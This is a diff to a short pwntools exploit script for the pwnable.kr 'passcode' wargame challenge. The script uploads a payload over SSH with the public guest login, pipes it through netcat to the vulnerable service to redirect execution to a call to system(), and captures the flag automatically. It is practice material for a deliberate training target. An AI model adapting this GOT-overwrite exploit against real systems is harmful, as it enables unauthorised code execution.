@@ -1,4 +1,4 @@
-from pwn import ssh, p32
+from pwn import ssh, p32, log
 
 # address of a lea eax,[ebx-0x1fb9] instruction before call to system()
 # 0x080492bd (134517437 in decimal)
@@ -13,10 +13,15 @@ payload += b"134517437"
 payload += b"\n"
 payload += b"arbitrary"
 
-attack = "cat /tmp/testing | nc 0 10004\n"
+attack = b"cat /tmp/testing | nc 0 10004\n"
 
 remote = ssh('passcode', 'pwnable.kr', password='guest', port=2222)
 remote.upload_data(payload, "/tmp/testing")
 proc = remote.run("bash")
-print(f"\nAttack with this::: {attack}")
-proc.interactive()
+proc.sendline(attack)
+flag = proc.recvuntil('credential :)')
+
+log.success(flag)
+
+proc.close()
+remote.close()
